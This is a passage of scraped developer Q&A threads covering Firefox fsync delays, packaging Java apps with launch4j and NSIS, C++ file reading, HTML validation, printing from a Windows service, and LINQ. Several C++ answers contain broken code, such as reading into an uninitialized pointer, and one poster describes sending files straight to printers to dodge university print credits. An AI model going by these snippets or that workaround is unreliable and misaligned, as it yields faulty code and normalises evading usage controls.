resources.\\n\\nAny suggestions or insights?\\n', 'It\\'s probably the awesome firefox3 fsync \"bug\", which is a giant pile of fail.\\n\\nIn summary\\n\\n\\nFirefox3 saves its bookmarks and history in an SQLite database\\nEvery time you load a page it writes to this database several times\\nSQLite cares deeply that you don\\'t lose your bookmarks, so each time it writes, instructs the kernel to flush it\\'s database file to disk and ensure that it\\'s fully written\\nMany variants of linux, when told to flush like that, flush EVERY FILE. This may take up to a minute or more if you have background tasks doing any kind of disk intensive stuff.\\nThe kernel makes firefox wait while this flush happens, which locks up the UI.\\n\\n', 'There\\'s no \"process explorer\" kind of tool for Firefox; but there\\'s http://developer.mozilla.org/en/docs/Venkman with profiling mode, which you could use to see the time spent by chrome (meaning non-content, that is not web-page) scripts.\\n\\nFrom what I\\'ve read about it, DTrace might also be useful for this sort of thing, but it requires creating a custom build and possibly adding additional probes to the source. I haven\\'t played with it myself yet.\\n', \"There's a thorough discussion of this that explains all of the fsync related problems that affected pre-3.0 versions of FF.  In general, I have not seen the behaviour since then either, and really it shouldn't be a problem at all if your system isn't also doing IO intensive tasks.  Firebug/Venkman make for nice debuggers, but they would be painful for figuring out these kinds of problems for someone else's code, IMO.\\n\\nI also wish that there was an easy way to look at CPU utilization in Firefox by tab, though, as I often find myself with FF eating 100% CPU, but no clue which part is causing the problem.\\n\", '\\n  So, my question is, is there a way to have some kind of process explorer, or task manager sort of thing for Firefox 3?\\n\\n\\nBecause of the way Firefox is built this is not possible at the moment. But the new Internet Explorer 8 Beta 2 and the just announced Google Chrome browser are heading in that direction, so I suppose Firefox will be heading there too.\\n\\nHere is a post (  Google Chrome Process Manager  ),by John Resig from Mozilla and jQuery fame on the subject.\\n', 'XUL Profiler is an awesome extension that can point out extensions and client side JS gone bananas CPU-wise. It does not work on a per-tab basis, but per-script (or so). You can normally relate those .js scripts to your tabs or extensions by hand.\\n\\nIt is also worth mentioning that Google Chrome has built-in a really good task manager that gives memory and CPU usage per tab, extension and plugin.\\n\\n\\n  [XUL Profiler] is a Javascript profiler. It\\n  shows elapsed time in each method as a\\n  graph, as well as browser canvas zones\\n  redraws to help track down consuming\\n  CPU chunks of code.\\n  \\n  Traces all JS calls and paint events\\n  in XUL and pages context. Builds an\\n  animation showing dynamically the\\n  canvas zones being redrawn.\\n\\n\\nAs of FF 3.6.10 it is not up to date in that it is not marked as compatible anymore. But it still works and you can override the incompatibility with the equally awesome MR Tech Toolkit extension.\\n'], [\"I am writing an application in Java for the desktop using the Eclipse SWT library for GUI rendering.  I think SWT helps Java get over the biggest hurdle for acceptance on the desktop: namely providing a Java application with a consistent, responsive interface that looks like that belonging to any other app on your desktop.  However, I feel that packaging an application is still an issue.  \\n\\nOS X natively provides an easy mechanism for wrapping Java apps in native application bundles, but producing an app for Windows/Linux that doesn't require the user to run an ugly batch file or click on a .jar is still a hassle.  Possibly that's not such an issue on Linux, where the user is likely to be a little more tech-savvy, but on Windows I'd like to have a regular .exe for him/her to run.\\n\\nHas anyone had any experience with any of the .exe generation tools for Java that are out there?  I've tried JSmooth but had various issues with it.  Is there a better solution before I crack out Visual Studio and roll my own?\\n\\nEdit:  I should perhaps mention that I am unable to spend a lot of money on a commercial solution.\\n\", 'Install4J. Not free, but worth it. Give the trial a shot\\n', \"I went through the same and found that all of the free options weren't very good. Looks like you'll be writing your own. I'd be interested to see if someone has a free/cheap option that works\\n\", 'Have you thought about Java Web Start?  Here is a tutorial specifically for deploying an SWT application with Java Web Start.\\n', \"Maybe you should take a look at IzPack. I created a very nice installer some years ago and I'd bet that they are still improving it. It allows the installation of docs, binaries and a clickable link to start the application IIRC.\\n\", 'Have you considered writing a small program in C/C++ that just calls CreateProcess to start up the java VM with the jar (or class) file?\\n\\nYou could get Visual C++ Express and put together the startup program pretty easily.  This would make it easy to add a friendly icon as well.\\n', \"Another option I was considering: rather than writing a native launcher from scratch, Eclipse comes with the source code for its own launcher, and this could perhaps be repurposed for my app.\\n\\nIt's a shame that Sun never included anything similar in the JDK.\\n\", \"I've used the free Launch4J to create a custom launcher for my Java programs on Windows. Combined with the free NSIS Installer you can build a nice package for your Windows users.\\n\\nEdit: Did not see that you use SWT. Don't know if it works with SWT as well, because I used only Swing in my apps.\\n\", 'In my company we use Launch4J to create the exe file, and NSIS to create the installer, with SWT applications. \\n\\nWe have used it for years in several commercial applications and the pair works fine.\\n', 'Another vote for Launch4J, just wrote an ant task this morning to integrate with one of my projects.  Seems to work really well\\n', \"Consider converting your application to Eclipse RCP.  It is written in SWT, and the Eclipse IDE contains packaging tools that generate executables for all major platforms.  For windows, it can generate a zip or a folder containing your code.  For a common installation experience, I'd using NSIS.  There is actually a packages generator project at eclipse to create common installers for all platforms eclipse supports.\\n\", 'To follow up on pauxu\\'s answer, I\\'m using launch4j and NSIS on a project of mine and thought it would be helpful to show just how I\\'m using them.  Here\\'s what I\\'m doing for Windows.  BTW, I\\'m creating .app and .dmg for Mac, but haven\\'t figured out what to do for Linux yet.\\n\\nProject Copies of launch4j and NSIS\\n\\nIn my project I have a \"vendor\" directory and underneath it I have a directory for \"launch4j\" and \"nsis\".  Within each is a copy of the install for each application.  I find it easier to have a copy local to the project rather than forcing others to install both products and set up some kind of environment variable to point to each.\\n\\nScript Files\\n\\nI also have a \"scripts\" directory in my project that holds various configuration/script files for my project.  First there is the launch4j.xml file:\\n\\n&lt;launch4jConfig&gt;\\n  &lt;dontWrapJar&gt;true&lt;/dontWrapJar&gt;\\n  &lt;headerType&gt;gui&lt;/headerType&gt;\\n  &lt;jar&gt;rpgam.jar&lt;/jar&gt;\\n  &lt;outfile&gt;rpgam.exe&lt;/outfile&gt;\\n  &lt;errTitle&gt;&lt;/errTitle&gt;\\n  &lt;cmdLine&gt;&lt;/cmdLine&gt;\\n  &lt;chdir&gt;.&lt;/chdir&gt;\\n  &lt;priority&gt;normal&lt;/priority&gt;\\n  &lt;downloadUrl&gt;http://www.rpgaudiomixer.com/&lt;/downloadUrl&gt;\\n  &lt;supportUrl&gt;&lt;/supportUrl&gt;\\n  &lt;customProcName&gt;false&lt;/customProcName&gt;\\n  &lt;stayAlive&gt;false&lt;/stayAlive&gt;\\n  &lt;manifest&gt;&lt;/manifest&gt;\\n  &lt;icon&gt;&lt;/icon&gt;\\n  &lt;jre&gt;\\n    &lt;path&gt;&lt;/path&gt;\\n    &lt;minVersion&gt;1.5.0&lt;/minVersion&gt;\\n    &lt;maxVersion&gt;&lt;/maxVersion&gt;\\n    &lt;jdkPreference&gt;preferJre&lt;/jdkPreference&gt;\\n  &lt;/jre&gt;\\n  &lt;splash&gt;\\n    &lt;file&gt;..\\\\images\\\\splash.bmp&lt;/file&gt;\\n    &lt;waitForWindow&gt;true&lt;/waitForWindow&gt;\\n    &lt;timeout&gt;60&lt;/timeout&gt;\\n    &lt;timeoutErr&gt;true&lt;/timeoutErr&gt;\\n  &lt;/splash&gt;\\n&lt;/launch4jConfig&gt;\\n\\n\\nAnd then there\\'s the NSIS script rpgam-setup.nsis.  It can take a VERSION argument to help name the file.\\n\\n; The name of the installer\\nName \"RPG Audio Mixer\"\\n\\n!ifndef VERSION\\n    !define VERSION A.B.C\\n!endif\\n\\n; The file to write\\noutfile \"..\\\\dist\\\\installers\\\\windows\\\\rpgam-${VERSION}.exe\"\\n\\n; The default installation directory\\nInstallDir \"$PROGRAMFILES\\\\RPG Audio Mixer\"\\n\\n; Registry key to check for directory (so if you install again, it will \\n; overwrite the old one automatically)\\nInstallDirRegKey HKLM \"Software\\\\RPG_Audio_Mixer\" \"Install_Dir\"\\n\\n# create a default section.\\nsection \"RPG Audio Mixer\"\\n\\n    SectionIn RO\\n\\n    ; Set output path to the installation directory.\\n    SetOutPath $INSTDIR\\n    File /r \"..\\\\dist\\\\layout\\\\windows\\\\\"\\n\\n    ; Write the installation path into the registry\\n    WriteRegStr HKLM SOFTWARE\\\\RPG_Audio_Mixer \"Install_Dir\" \"$INSTDIR\"\\n\\n    ; Write the uninstall keys for Windows\\n    WriteRegStr HKLM \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\RPGAudioMixer\" \"DisplayName\" \"RPG Audio Mixer\"\\n    WriteRegStr HKLM \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\RPGAudioMixer\" \"UninstallString\" \\'\"$INSTDIR\\\\uninstall.exe\"\\'\\n    WriteRegDWORD HKLM \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\RPGAudioMixer\" \"NoModify\" 1\\n    WriteRegDWORD HKLM \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\RPGAudioMixer\" \"NoRepair\" 1\\n    WriteUninstaller \"uninstall.exe\"\\n\\n    ; read the value from the registry into the $0 register\\n    ;readRegStr $0 HKLM \"SOFTWARE\\\\JavaSoft\\\\Java Runtime Environment\" CurrentVersion\\n\\n    ; print the results in a popup message box\\n    ;messageBox MB_OK \"version: $0\"\\n\\nsectionEnd\\n\\nSection \"Start Menu Shortcuts\"\\n  CreateDirectory \"$SMPROGRAMS\\\\RPG Audio Mixer\"\\n  CreateShortCut \"$SMPROGRAMS\\\\RPG Audio Mixer\\\\Uninstall.lnk\" \"$INSTDIR\\\\uninstall.exe\" \"\" \"$INSTDIR\\\\uninstall.exe\" 0\\n  CreateShortCut \"$SMPROGRAMS\\\\RPG AUdio Mixer\\\\RPG Audio Mixer.lnk\" \"$INSTDIR\\\\rpgam.exe\" \"\" \"$INSTDIR\\\\rpgam.exe\" 0\\nSectionEnd\\n\\nSection \"Uninstall\"\\n\\n    ; Remove registry keys\\n    DeleteRegKey HKLM \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\RPGAudioMixer\"\\n    DeleteRegKey HKLM SOFTWARE\\\\RPG_Audio_Mixer\\n\\n    ; Remove files and uninstaller\\n    Delete $INSTDIR\\\\rpgam.exe\\n    Delete $INSTDIR\\\\uninstall.exe\\n\\n    ; Remove shortcuts, if any\\n    Delete \"$SMPROGRAMS\\\\RPG Audio Mixer\\\\*.*\"\\n\\n    ; Remove directories used\\n    RMDir \"$SMPROGRAMS\\\\RPG Audio Mixer\"\\n    RMDir \"$INSTDIR\"\\n\\nSectionEnd\\n\\n\\nAnt Integration\\n\\nI have some targets in my Ant buildfile (build.xml) to handle the above.  First I tel Ant to import launch4j\\'s Ant tasks:\\n\\n&lt;property name=\"launch4j.dir\" location=\"vendor/launch4j\" /&gt;\\n&lt;taskdef name=\"launch4j\" \\n    classname=\"net.sf.launch4j.ant.Launch4jTask\"\\n    classpath=\"${launch4j.dir}/launch4j.jar:${launch4j.dir}/lib/xstream.jar\" /&gt;\\n\\n\\nI then have a simple target for creating the wrapper executable:\\n\\n&lt;target name=\"executable-windows\" depends=\"jar\" description=\"Create Windows executable (EXE)\"&gt;\\n    &lt;launch4j configFile=\"scripts/launch4j.xml\" outfile=\"${exeFile}\" /&gt;\\n&lt;/target&gt;\\n\\n\\nAnd another target for making the installer:\\n\\n&lt;target name=\"installer-windows\" depends=\"executable-windows\" description=\"Create the installer for Windows (EXE)\"&gt;\\n    &lt;!-- Lay out files needed for building the installer --&gt;\\n    &lt;mkdir dir=\"${windowsLayoutDirectory}\" /&gt;\\n    &lt;copy file=\"${jarFile}\" todir=\"${windowsLayoutDirectory}\" /&gt;\\n    &lt;copy todir=\"${windowsLayoutDirectory}/lib\"&gt;\\n        &lt;fileset dir=\"${libraryDirectory}\" /&gt;\\n        &lt;fileset dir=\"${windowsLibraryDirectory}\" /&gt;\\n    &lt;/copy&gt;\\n    &lt;copy todir=\"${windowsLayoutDirectory}/icons\"&gt;\\n         &lt;fileset dir=\"${iconsDirectory}\" /&gt;\\n    &lt;/copy&gt;\\n    &lt;copy todir=\"${windowsLayoutDirectory}\" file=\"${exeFile}\" /&gt;\\n\\n    &lt;mkdir dir=\"${windowsInstallerDirectory}\" /&gt;\\n\\n    &lt;!-- Build the installer using NSIS --&gt;\\n    &lt;exec executable=\"vendor/nsis/makensis.exe\"&gt;\\n        &lt;arg value=\"/DVERSION=${version}\" /&gt;\\n        &lt;arg value=\"scripts/rpgam-setup.nsi\" /&gt;\\n    &lt;/exec&gt;\\n&lt;/target&gt;\\n\\n\\nThe top portion of that just copies the necessary files for the installer to a temporary location and the second half executes the script that uses all of it to make the installer.\\n', 'I have used JSmooth in the past, and still have luck with it.  The UI is pretty buggy, but I only use that for building the config file once, and then I build from Ant after that.\\n\\nWhat issues are you having with JSmooth?\\n', 'JSMooth has worked very well for us in a production environment, where I first generated a single jar using one-jar (fat jar plugin to eclipse) and then wrapped it with JSmooth.\\n\\n(Please note that I wanted a no-install distribution of a single file, which could promt for installing the JRE if needed).\\n\\nIt has worked so well that I thought nobody was using it :)\\n', 'You may want to try our tool, BitRock InstallBuilder. Although it is a native application, a lot of our customers use it to package desktop Java applications. If you bundle the JRE and create launcher, etc. the user does not even need to know they are installing a Java application. It is cross platform, so you can generate installers for both Windows and Mac (and Linux, Solaris, etc.) Like install4j tool mentioned in another post, it is a commercial tool, but we have free licenses for open source projects and special discounts for microISVs / small business, etc. just drop us an email.  Also wanted to emphasize that this is an installer tool, so it will not address your needs if you are looking only for a single file executable.\\n', 'In my company we use launch4J and NSIS for the windows distribution, and jdeb for the Debian distribution, and Java Web Start for the general operating system. This works quite fine.\\n', 'Please try InstallJammer.The best one I have used ever. Free and powerful.And sufficient for personal and commercial use.\\n', \"You can now do this through Netbeans! It's really easy and works perfectly. Check out this tutorial on the Netbeans website.\\n\", \"Have you considered Advanced Installer?\\nI have used it severally especially for Windows and Mac. No scripting or Ant required. All GUI. Very simple and understandable. Ain't free but worth every penny.\\n- Lauch as Administrator\\n- File Association\\n- Custom Install Themes + In built Themes\\n- Package with JRE\\n- Install location\\n- Native Splash screen implementation\\n- You can event create services and installation events\\n- Prerequisites\\n- JRE minimum version and maximum version\\n\\nAnd a lot more. And don't get it twisted, i have no connections with the dudes...their App is just awesome.\\n\"], ['I want to open a file for reading, the C++ way. I need to be able to do it for:\\n\\n\\ntext files, which would involve some sort of read line function.\\nbinary files, which would provide a way to read raw data into a char* buffer.\\n\\n', 'There are three ways to do this, depending on your needs. You could use the old-school C way and call fopen/fread/fclose, or you could use the C++ fstream facilities (ifstream/ofstream), or if you\\'re using MFC, use the CFile class, which provides functions to accomplish actual file operations.\\n\\nAll of these are suitable for both text and binary, though none have a specific readline functionality. What you\\'d most likely do instead in that case is use the fstream classes (fstream.h) and use the stream operators (&lt;&lt; and >>) or the read function to read/write blocks of text:\\n\\nint nsize = 10;\\nchar *somedata;\\nifstream myfile;\\nmyfile.open(\"&lt;path to file&gt;\");\\nmyfile.read(somedata,nsize);\\nmyfile.close();\\n\\n\\nNote that, if you\\'re using Visual Studio 2005 or higher, traditional fstream may not be available (there\\'s a new Microsoft implementation, which is slightly different, but accomplishes the same thing).\\n', 'You need to use an ifstream if you just want to read (use an ofstream to write, or an fstream for both).\\n\\nTo open a file in text mode, do the following:\\n\\nifstream in(\"filename.ext\", ios_base::in); // the in flag is optional\\n\\n\\nTo open a file in binary mode, you just need to add the \"binary\" flag.\\n\\nifstream in2(\"filename2.ext\", ios_base::in | ios_base::binary ); \\n\\n\\nUse the ifstream.read() function to read a block of characters (in binary or text mode).  Use the getline() function (it\\'s global) to read an entire line.\\n', 'fstream are great but I will go a little deeper and tell you about RAII.\\n\\nThe problem with a classic example is that you are forced to close the file by yourself, meaning that you will have to bend your architecture to this need. RAII makes use of the automatic destructor call in C++ to close the file for you.\\n\\nUpdate: seems that std::fstream already implements RAII so the code below is useless. I\\'ll keep it here for posterity and as an example of RAII. \\n\\nclass FileOpener\\n{\\npublic:\\n    FileOpener(std::fstream&amp; file, const char* fileName): m_file(file)\\n    { \\n        m_file.open(fileName); \\n    }\\n    ~FileOpeneer()\\n    { \\n        file.close(); \\n    }\\n\\nprivate:\\n    std::fstream&amp; m_file;\\n};\\n\\n\\nYou can now use this class in your code like this:\\n\\nint nsize = 10;\\nchar *somedata;\\nifstream myfile;\\nFileOpener opener(myfile, \"&lt;path to file&gt;\");\\nmyfile.read(somedata,nsize);\\n// myfile is closed automatically when opener destructor is called\\n\\n\\nLearning how RAII works can save you some headaches and some major memory management bugs.\\n', '#include &lt;iostream&gt;\\n#include &lt;fstream&gt;\\nusing namespace std;\\n\\nvoid main()\\n{\\n    ifstream in_stream; // fstream command to initiate \"in_stream\" as a command.\\n    char filename[31]; // variable for \"filename\".\\n    cout &lt;&lt; \"Enter file name to open :: \"; // asks user for input for \"filename\".\\n    cin.getline(filename, 30); // this gets the line from input for \"filename\".\\n    in_stream.open(filename); // this in_stream (fstream) the \"filename\" to open.\\n    if (in_stream.fail())\\n    {\\n        cout &lt;&lt; \"Could not open file to read.\"\"\\\\n\"; // if the open file fails.\\n        return;\\n    }\\n    //.....the rest of the text goes beneath......\\n}\\n\\n', 'To open and read a text file line per line, you could use the following:\\n\\n// define your file name\\nstring file_name = \"data.txt\";\\n\\n// attach an input stream to the wanted file\\nifstream input_stream(file_name);\\n\\n// check stream status\\nif (!input_stream) cerr &lt;&lt; \"Can\\'t open input file!\";\\n\\n// file contents  \\nvector&lt;string&gt; text;\\n\\n// one line\\nstring line;\\n\\n// extract all the text from the input file\\nwhile (getline(input_stream, line)) {\\n\\n    // store each line in the vector\\n    text.push_back(line);\\n}\\n\\n\\nTo open and read a binary file you need to explicitly declare the reading format in your input stream to be binary, and read memory that has no explicit interpretation using stream member function read():\\n\\n// define your file name\\nstring file_name = \"binary_data.bin\";\\n\\n// attach an input stream to the wanted file\\nifstream input_stream(file_name, ios::binary);\\n\\n// check stream status\\nif (!input_stream) cerr &lt;&lt; \"Can\\'t open input file!\";\\n\\n// use function that explicitly specifies the amount of block memory read \\nint memory_size = 10;\\n\\n// allocate 10 bytes of memory on heap\\nchar* dynamic_buffer = new char[memory_size];\\n\\n// read 10 bytes and store in dynamic_buffer\\nfile_name.read(dynamic_buffer, memory_size);\\n\\n\\nWhen doing this you\\'ll need to #include the header : &lt;iostream&gt;\\n'], ['Even though I always strive for complete validation these days, I often wonder if it\\'s a waste of time.  If the code runs and it looks the same in all browsers (I use browsershots.org to verify) then do I need to take it any further or am I just being overly anal?\\n\\nWhat level do you hold your code to when you create it for:\\n\\na) yourself\\nb) your clients\\n\\nP.S. Jeff and company, why doesn\\'t stack overflow validate? :)\\n\\nEDIT: Some good insights, I think that since I\\'ve been so valid-obsessed for so long I program knowing what will cause problems and what won\\'t so I\\'m in a better position than people who create a site first and then \"go back and fix the validation problems\"\\n\\nI think I may post another question on stack overflow; \"Do you validate as you go or do you finish and then go back and validate?\" as that seems to be where this question is going\\n', \"a) Must look the same\\n\\nb) As standards-compliant as possible, but not so anal that it blocks finishing work\\n\\nIn a situation where you have perpetual access to the code, I don't think standards-compliance is all that important, since you can always make changes to the code if something breaks. If you don't have perpetual access (ie, you sign off on the code and it becomes someone else's responsibility), it's probably best to be as standards-compliant as possible to minimize maintenance headaches later... even if you never have to deal with the code again, your reputation persists and can be transmitted to other potential clients, and many teams like to blame the previous developer(s) for problems that come up.\\n\", \"I think validation is a good litmus test of whether you've done things properly, so if there are only a few minor problems, why not fix them and ensure your site will at least be understood correctly by browsers in the future (even if they do render things differently for other reasons)?\\n\\nOTOH, for most projects, validation seems like a huge headache and if you can get things working across browsers, it's not worth spending an extra day/week+ on just validation.\\n\", \"I think this is an area in which you should strive to use the Robustness principle as far as is practical (which is good advice for any area of coding). Just because something works today doesn't mean it will work tomorrow: if you're relying on a particular HTML/CSS hack or even if you've just been a little lax in emitting strictly valid code, the next iteration of browsers could well break. Doing it once the right way minimises this problem (though does not entirely mitigate it).\\n\\nThere is a certain element of pragmatism to take here, though. I'd certainly do all I could for a client's site to be valid, but I would be willing to take more risks in my own space.\\n\", 'I think it\\'s only \"tech\" guys that really care for \"100% standard compliance\". My usual page consumers (= users) don\\'t care if there\\'s no alt-attribute for a \"menu border picture element\".\\n\\nI usually just make sure that I don\\'t see any obvious errors (all tags closed, all lower case, attributes in quotes, ...), but if it looks good on IE and FF, that\\'s all I care for. I don\\'t really care if I use a non-standard attribute in any HTML tag, so that the page doesn\\'t validate against an DTD - as long as I get the visual results that I intended to get.\\n', \"I know this isn't answering your whole question, but it is worth considering that by using completely valid html you can be sure that your website should work properly in future web browsers that haven't been released yet.\\n\", 'My approach tends to be to ensure I can completely validate on all pages, however I still send the page as text/html instead of application/xhtml+xml so there are no ugly XML errors in the event I have missed something.\\n', \"For me, I feel like I've done a good job if my code validates. Seeing the green check box on the w3c pages just makes me slightly giddy. As for group b, They usually only care that it looks and works the same across browsers. They only place I've found that this is not true is the government sector. They require complete validation not only with the w3c but also passing ADA tests (basically how does it sound with a screen reader). \\n\\np.s. when I say government sector, I mean specifically the state of California and a few counties inside it. I have had no ther experience with other government groups besides them.\\n\", 'Except that the validators themselves are so positively anal,\\n when they flag an error or warning whenever a -moz- or -webkit or -o- i.e. a browser specific qualification term is used.\\nalso they want you to specify 0px rather than 0 or other units\\nZero is Zero whatever units the validator wants to check it against!\\n\\njust try validating the WordPress twentyeleven style.css it throws 140 odd errors which are all of the nature above or the validator is recovering from parse errors\\n\\nThe validators are useless if you cannot sort the wheat from the chaff!!!\\n\\nWe need validators that recognise browser specific qualification terms!\\n', 'For understanding why validation matters, it is needed to understand how a browser works at its different layers, and also a little bit about the history of web from the perspective of web browsers.\\n\\nThe HTML you give to a browser is interpreted by the browser following the DOM, an application programming interface that maps out the entire page as a hierarchy of nodes. Each part of that  tree is a type of node containing different kinds of data. DOM (Document Object Model) was necessary because of the diversity of HTML pages that early web browsers (Netscape, IE...) implemented to allow alter the appearance and content of a web page without reloading it. For preserving the cross-platform nature of the web, W3C wanted to fix the different implementation of those browsers, proposing DOM.\\n\\nDOM support became a huge priority for most web browsers vendors, and efforts have been ongoing to improve support on each release. So, it worked.\\n\\nDOM is the very basic step with which a web browser starts. Its main flow is:\\n\\n\\nparsing HTML to construct the DOM tree\\nrender tree construction\\nlayout of the render tree\\npainting the render tree\\n\\n\\nThe step 1 gives the content tree, with the tags turned to DOM nodes. The step 2 gives the render tree, containing styling information.\\n\\nSo, why validation matters: because content tree and render tree are the basis from which the web browser start its job. The most they are well defined, the better for the web browser.\\n\\nUltimately, the DOM is also the basis for your JavaScript events. So, its validation helps to the interaction layer too.\\n'], [\"I am working on a project right now that involves receiving a message from another application, formatting the contents of that message, and sending it to a printer.  Technology of choice is C# windows service.  The output could be called a report, I suppose, but a reporting engine is not necessary.  A simple templating engine, like StringTemplate, or even XSLT outputting HTML would be fine.  The problem I'm having is finding a free way to print this kind of output from a service.  Since it seems that it will work, I'm working on a prototype using Microsoft's RDLC, populating a local report and then rendering it as an image to a memory stream, which I will then print.  Issues with that are:\\n\\n\\nMulti-page printing will be a big headache.\\nStill have to use PrintDocument to print the memory stream, which is unsupported in a Windows Service (though it may work - haven't gotten that far with the prototype yet)\\nIf the data coming across changes, I have to change the dataset, and the class that the data is being deserialized into.  bad bad bad.\\n\\n\\nHas anyone had to do anything remotely like this?  Any advice?  I already posed a question about printing HTML without user input, and after wasting about 3 days on that, I have come to the conclusion that it cannot be done, at least not with any freely available tool.\\n\\nAll help is appreciated.\\n\\nEDIT: We are on version 2.0 of the .NET framework.\\n\", \"This may not be what you're looking for, but if I needed to do this quick&amp;dirty, I would:\\n\\n\\nCreate a separate WPF application (so I could use the built-in document handling)\\nGive the service the ability to interact with the desktop (note that you don't actually have to show anything on the desktop, or be logged in for this to work)\\nHave the service run the application, and give it the data to print.\\n\\n\\nYou could probably also jigger this to print from a web browser that you run from the service (though I'd recommend building your own shell IE, rather than using a full browser).\\n\\nFor a more detailed (also free) solution, your best bet is probably to manually format the document yourself (using GDI+ to do the layout for you). This is tedious, error prone, time consuming, and wastes a lot of paper during development, but also gives you the most control over what's going to the printer.\\n\", \"Printing from a Windows service is really painful. It seems to work... sometimes... but finally it craches or throws an exception from time to time, without any clear reason. It's really hopeless. Officially, it's even not supported, without any explanation, nor any proposal for an alternate solution.\\n\\nRecently, I have been confronted to the problem and after several unsuccessful trials and experimentations, I came finally with two viable solutions:\\n\\n\\nWrite your own printing DLL using the Win32 API (in C/C++ for instance), then use it from your service with P/Invoke (works fine)\\nWrite your own printing COM+ component, then uses it from your service. I have chosen this solution with success recently (but it was third party COM+ component, not own written) It works absolutely fine too.\\n\\n\", 'Trust me, you will spend more money trying to search/develop a solution for this as compared to buying a third party component. Do not reinvent the wheel and go for the paid solution.\\n\\nPrinting is a complex problem and I would love to see the day when better framework support is added for this.\\n', \"I think we are going to go the third party route.  I like the XSL -> HTML -> PDF -> Printer flow... Winnovative's HTML to PDF looks good for the first part, but I'm running into a block finding a good PDF printing solution... any suggestions?  Ideally the license would be on a developer basis, not on a deployed runtime basis.\\n\", 'Printing from a service is a bad idea. Network printers are connected \"per-user\". You can mark the service to be run as a particular user, but I\\'d consider that a bad security practice. You might be able to connect to a local printer, but I\\'d still hesitate before going this route.\\n\\nThe best option is to have the service store the data and have a user-launched application do the printing by asking the service for the data. Or a common location that the data is stored, like a database. \\n\\nIf you need to have the data printed as regular intervals, setup a Task event thru the Task Scheduler. Launching a process from a service will require knowing the user name and password, which again is bad security practice.\\n\\nAs for the printing itself, use a third-party tool to generate the report will be the easiest.\\n', \"To answer your first question, this can be fairly straight forward depending on the data.  We have a variety of Service-based applications that do exactly what you are asking.  Typically, we parse the incoming file and wrap our own Postscript or PCL around it.  If you layout is fairly simple, then there are some very basic PCL codes you can wrap it with to provide the font/print layup you want (I'd be more then happy to give you some guidance here offline).\\n\\nOne you have a print ready file you can send it to a UNC printer that is shared, directly to a locally installed printer, or even to the IP of the device (RAW or LPR type data).\\n\\nIf, however, you are going down the PDF path, the simplest method is to send the PDF output to a printer that supports direct PDF printing (many do now). In this case you just send the PDF to the device and away it prints. \\n\\nThe other option is to launch Ghostscript which should be free for your needs (check the licensing as they have a few different version, some GNU, some GPL etc.) and either use it's built in print function or simply convert to Postscript and send to the device.  I've used Ghostscript many times in Service apps but not a huge fan as you will basically be shelling out and executing a command line app to do the conversion.  That being said, it's a stable app that does tend to fail gracefully\\n\", \"I've done it.  It's a pain in the A*s.  The problem is that printing requires that GDI engine to be in place, which normally means that you have to have the desktop, which only loads when you're logged in.  If you're attempting to do this from a Service on a Server, then you normally aren't logged in.\\n\\nSo first you can't run as the normal service user, but instead as a real user that has interactive login rights. Then you have to tweak the service registry entries (I forget how at the moment, would have to find the code which I can do tonight if you're really interested).  Finally, you have to pray.\\n\\nYour biggest long term headache will be with print drivers.  If you are running as a service without a logged in user, some print drivers like to pop up dialogs from time to time.  What happens when your printer is out of toner?  Or out of paper?  The driver may pop up a dialog that will never be seen, and hold up the printer queue because nobody is logged in!\\n\", 'If you can output to post script some printers will print anything that gets FTPed to a certain directory on them.\\n\\nWe used this to get past the print credits that our university exposed on us, but if your service outputs to a ps then you can just ftp the ps file to the printer.\\n', 'In answer to your question about PDF printing, I have not found an elegant solution. I was \"shell\" ing out to Adobe which was unreliable and required a user to be logged in at all times. To fix this specific problem, I requested that the files we process (invoices) be formatted as multi-page Tiff files instead which can be split apart and printed using native .NET printing functions. Adobe\\'s position seems to be \"get the user to view the file in Adobe Reader and they can click print\". Useless.\\n\\nI am still keen to find a good way of producing quality reports which can be output from the web server...\\n', \"Printing using System.Drawing.Printing is not supported by MS, as per Yann Trevin's response.  However, you might be able to use the new, WPF-based, System.Printing (I think)\\n\", \"We are using DevExpress' XtraReports to print from a service without any problems.  Their report model is similar to that of Windows Forms, so you could dynamically insert text elements and then issue the print command.\\n\"], ['During the beta of Stack Overflow, I have seen quite a few questions about LINQ SQL but know nothing about it... it sounds very interesting.\\n\\nWhat is LINQ and how do I get started?\\n\\nLinks guides or documentation a bonus :)\\n\\nPS: I am a long time C# developer who daily uses Datatables and Parameterized SQL\\n', \"Here you go. I started with ScottGu's explanation/examples and went from there:\\n\\nhttp://weblogs.asp.net/scottgu/archive/2007/05/19/using-linq-to-sql-part-1.aspx\\n\", \"LINQ stands for Language Integrated Query and is a set of extensions for .NET that allow you to query data the same way from code and isn't tied to a specific data source.  You can use the same LINQ code for SQL Server, XML, objects, DataSets, and Entities.\\n\\nHere is a good intro from Scott Guthrie\\n\\nThis is a nice set of 101 LINQ Samples\\n\", '\\nStart with everything Scott Guthrie has on linq\\nGet LINQ Pocket Reference, which is an excerpt from C# 3.0 in a Nutshell\\n\\n', 'Here are a couple of good tutorials (video) from OakLeaf Systems:\\n\\nhttp://oakleafblog.blogspot.com/2007/04/two-new-linq-to-sql-video-segments-from.html\\nhttp://oakleafblog.blogspot.com/2007/05/mike-taulty-posts-six-new-linq-to-xml.html\\n\\nEDIT: I just ran into this great tool created by the author of C# in a Nutshell:\\nhttp://www.linqpad.net/\\nIt includes lots of great easy to follow samples.\\n', \"Two books you should consider for learning about LINQ, both from Manning:\\n\\n\\nC# in Depth\\nLINQ in Action\\n\\n\\nThe former was by far the better written, and taught me almost as much about LINQ in a single chapter than the latter did in a whole book.  LINQ is built on a lot of foundation, and C# in Depth builds it up from the ground.\\n\\nThe second book is a whole lot better than nothing, and you will learn things specifically about LINQ that you won't learn in the first.  But the first book will give you much better foundation, and puts up at least a token perspective instead of more or less blindly following the MS line.  So, I'm recommending C# in Depth first and foremost for learning LINQ.\\n\\nMike\\n\", 'Linq is short for \"Language integrated query.\" It\\'s a set of language enhancements built into C# and VB. Basically, what you get is a bunch of  standard query operators that can be applied to any IEnumerable of type T. There\\'s a lot of different linq providers for specific types of data- for example, there\\'s linq to xml, linq to entities, even linq to sharepoint. \\n\\nTo get started with linq, in all its many forms, I suggest the book Pro Linq by Joseph C. Rattz. It\\'s an excellent 